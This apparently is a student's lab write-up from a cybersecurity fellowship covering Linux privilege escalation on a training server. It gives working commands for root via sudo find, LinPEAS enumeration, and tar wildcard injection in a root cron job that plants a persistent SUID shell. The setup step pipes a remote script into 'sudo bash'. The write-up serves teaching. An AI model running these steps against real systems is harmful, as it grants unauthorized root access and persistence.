# 🪜 W8 | S23 — Climbing the Ladder: Privilege Escalation

**Program:** The Knowledge House (TKH) — Innovation Fellowship
**Operator:** Wendtin
**Target:** TitanCorp Development Server
**Objective:** Vertical privilege escalation from a restricted `limited_user` shell to `root`

---

## 🎯 Mission Overview

Breached into a TitanCorp development server as a low-privilege user (`limited_user`). Goal: escalate to root by identifying and exploiting administrative misconfigurations in the system — no brute force, no zero-days. Just lazy sysadmin mistakes.

Three escalation paths were executed:
1. **Sudo misconfiguration abuse** (GTFOBins — `find`)
2. **Automated enumeration** with LinPEAS
3. **Cron job wildcard injection** (persistent SUID shell)

---

## ⚙️ Environment Setup

```bash
curl -sL https://gist.githubusercontent.com/grobbins-cell/e19d720f62ba447b9e520e63dc734abd/raw/s23_provision.sh | sudo bash
```

Waited for: `[+] PROVISIONING COMPLETE`

---

## 🔴 Phase 1: Sudo Abuse (GTFOBins — `find`)

**Vulnerability:** `limited_user` was granted passwordless sudo access to `/usr/bin/find` — a binary that can execute arbitrary commands via `-exec`.

```bash
# Switch to restricted user
su - limited_user
# Password: titan123

# Check sudo permissions
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/find

# Exploit find to spawn a root shell
sudo find . -exec /bin/sh -p \; -quit

# Verify
whoami
# Output: root
```

**Result:** Root shell obtained via GTFOBins `find` exploit.

---

## 🟡 Phase 2: Automated Enumeration (LinPEAS)

```bash
cd ~/Linux_PrivEsc/
./linpeas.sh
```

**Key Finding — Cron Job (RED/YELLOW):**
```
* * * * * root /usr/local/bin/backup.sh
```

- Script `backup.sh` runs every 60 seconds as `root`
- Inside the script: `tar -cf /tmp/backup.tar *`
- The `*` wildcard is **exploitable** via filename injection

---

## 🟠 Phase 3: Cron Job Wildcard Injection

**Vulnerability:** The root-owned cron job uses `tar` with an unquoted wildcard (`*`). Because `tar` interprets filenames beginning with `--` as flags, crafted filenames can inject arbitrary command-line options — including executing a shell script.

```bash
# Move into the target directory
cd /home/limited_user/backups

# Step 1: Create the malicious payload
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh

# Step 2: Create "flag" files that tar reads as options
touch ./"--checkpoint=1"
touch ./"--checkpoint-action=exec=sh runme.sh"

# Step 3: Wait ~60 seconds for cron to fire, then verify
ls -l /tmp/rootbash
# Look for 's' in permissions: -rwsr-sr-x (SUID bit set)

# Step 4: Activate the SUID root shell
/tmp/rootbash -p

# Step 5: Confirm root
id
# Output: uid=1001(limited_user) gid=1001(limited_user) euid=0(root)
```

**Result:** Persistent SUID shell created at `/tmp/rootbash`. Full root access achieved via cron job wildcard injection.

---

## 📋 Escalation Path Summary

| Phase | Vector | Technique | Result |
|-------|--------|-----------|--------|
| 1 | Sudo misconfiguration | `find -exec /bin/sh` via GTFOBins | Root shell |
| 2 | LinPEAS enumeration | Automated scanning | Cron job identified |
| 3 | Cron wildcard injection | `tar *` filename poisoning → SUID shell | `euid=0(root)` |

---

## 🧠 Concepts Practiced

- **GTFOBins** — exploiting legitimate binaries for privilege escalation
- **Sudo misconfiguration** — NOPASSWD rules on powerful binaries
- **LinPEAS** — automated Linux privilege escalation enumeration
- **Cron job abuse** — weaponizing scheduled root tasks
- **Wildcard injection** — exploiting shell glob expansion in `tar`
- **SUID abuse** — creating setuid binaries for persistent root access

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `sudo -l` | Enumerate sudo permissions |
| `find` | GTFOBins exploit vector |
| `linpeas.sh` | Automated privilege escalation enumeration |
| `tar` | Exploited via wildcard injection |
| `touch` | Crafted malicious flag filenames |
| `chmod +s` | Set SUID bit on rootbash |

---

## 🚩 Proof of Exploitation

```
# Phase 1
$ whoami
root

# Phase 3
$ id
uid=1001(limited_user) gid=1001(limited_user) euid=0(root)
```

---

> ⚠️ *Conducted in an isolated lab environment for educational purposes only.*